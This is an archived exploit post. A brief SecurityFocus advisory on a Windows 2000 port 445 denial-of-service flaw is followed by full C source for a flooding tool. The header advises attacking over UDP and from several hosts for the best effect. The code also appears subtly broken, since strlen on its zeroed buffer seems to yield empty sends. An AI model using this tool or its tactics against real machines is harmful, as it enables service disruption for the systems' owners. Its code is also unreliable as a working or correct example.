source: http://www.securityfocus.com/bid/4532/info

An issue has been discovered in Windows 2000, which could cause a denial of system services.

Submitting malformed data to port 445 could cause the Lanman service to consume high CPU and Kernel mode memory usage. 

/********************************************************
* 	Microsoft Windows 2000 Remote DoS 		*
*	---------------------------------		*
*							*
* Hello :)						*
* This is an DoS exploit that utilizes the flaw found 	*
* by KPMG Denmark, to crasch or hang any Win2k box 	*
* running the LanMan server on port 445 (ms-ds).  	*
* What it does is just a simple 10k NULL string		*
* bombardment of port 445 TCP or UDP.			*
*							*
*			                                *
* By: Daniel Nystrom <exce@netwinder.nu>		*
* Download: www.telhack.tk / exce.darktech.org		*
*							*
* Suggestions: When performing the attack, use UDP if 	*
*	       you are attacking from a single host. 	*
*	       TCP only eats about 35% CPU on an AMD	*
*	       Athlon XP 1800+ while UDP eats 99%.      *
*	       So if TCP is the only option, use more   *
*	       than one attacking host. All in all this *
*              DoS is "pretty weak" and should be used  *
*              from more than one host in each attack   *
*              to get the best result.                  *
*							*
* Compiles on: Linux (Debian 2.2r6 and RH 7.3 tested).  *
*              Should compile on other *nix's as well.  *
*							*
* Thanks: Peter Grundl, for answering my Q's :)         *
*							*
* greets: xenogen, ifa-, zeromatic, RTJ, all@telhack    *
*							*
********************************************************/

#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <errno.h>

#define MICROSOFT_DS_PORT 445

unsigned long resolveTarget(char nstarget[]);


int main(int argc, char *argv[])
{
        int sock;
	int count;
	struct sockaddr_in target;
	unsigned short port = MICROSOFT_DS_PORT;
	char *nullbuffer;


	printf("%c[41m", 0x1B);
	fprintf(stdout, "\n--[ excE's Remote Microsoft Windows 2000 DoS (microsoft-ds)\n"); 
	printf("%c[0m", 0x1B);
	fprintf(stdout, "-----------------------------------------------------------\n");

        if(argc != 4)
        {
                fprintf(stderr, "--[ Invalid number of parameters!\n");
                fprintf(stderr, "--[ Usage: %s <Server IP> <TCP/UDP> <Send Count>\n", argv[0]);
                fprintf(stderr, "--[ Forex: %s 127.0.0.1 UDP 10000\n\n", argv[0]);
                exit(-1);
        }

	nullbuffer = (char *) malloc(10*1024*sizeof(char));
	bzero(nullbuffer,sizeof(nullbuffer));
	
	fprintf(stdout, "--[ Starting attack on %s...\n", argv[1]);

	memset(&target, 0, sizeof(target));
	target.sin_family 	= AF_INET;
	target.sin_addr.s_addr 	= resolveTarget(argv[1]);
	target.sin_port		= htons(port);


	if(argv[2][0] == 'U')
	{
		if((sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
		{
			perror("socket() failed ");
			exit(-1);
		}
	
		fprintf(stdout, "--[ Sending NULL byte string * %d via UDP\n", atoi(argv[3]));

		for(count=0;count<atoi(argv[3]);count++)
		{
		    if(sendto(sock, nullbuffer, strlen(nullbuffer), 0, (struct sockaddr *) &target, sizeof(target)) != strlen(nullbuffer))
		    {
				perror("sendto() failed ");
				exit(-1);
		    } else { printf("."); } 
		}
		close(sock);
		printf("\n");
	}
	 else if(argv[2][0] == 'T')
	{
		
		fprintf(stdout, "--[ Connecting and sending NULL byte string * %d...\n", atoi(argv[3]));
		 
		if((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
		{
			perror("socket() failed ");
			exit(-1);
		}

		if(connect(sock, (struct sockaddr *) &target, sizeof(target)) < 0)
		{
			perror("connect() failed ");
			exit(-1);
		}

		for(count=0;count<atoi(argv[3]);count++)
		{ 
			if(send(sock, nullbuffer, strlen(nullbuffer), 0) != strlen(nullbuffer))
			{
				perror("send() failed ");
				exit(-1);
			} else { printf("."); }

		}
		close(sock);
		printf("\n");
	} else
	{
		fprintf(stderr, "--[ Error: You must define a protocol (TCP or UDP)\n\n");
		exit(-1);
	}

	fprintf(stdout, "--[ Finished flooding target!\n");
	fprintf(stdout, "--[ http://www.telhack.tk\n");
	
	return 0;
}

unsigned long resolveTarget(char nstarget[])
{
	struct hostent *targetname;

	if((targetname=gethostbyname(nstarget)) == NULL)
	{
		fprintf(stderr, "--[ Name lookup failed. Please enter a valid IP or hostname\n");
		exit(-1);
	}

	return *((unsigned long *) targetname->h_addr_list[0]);
}
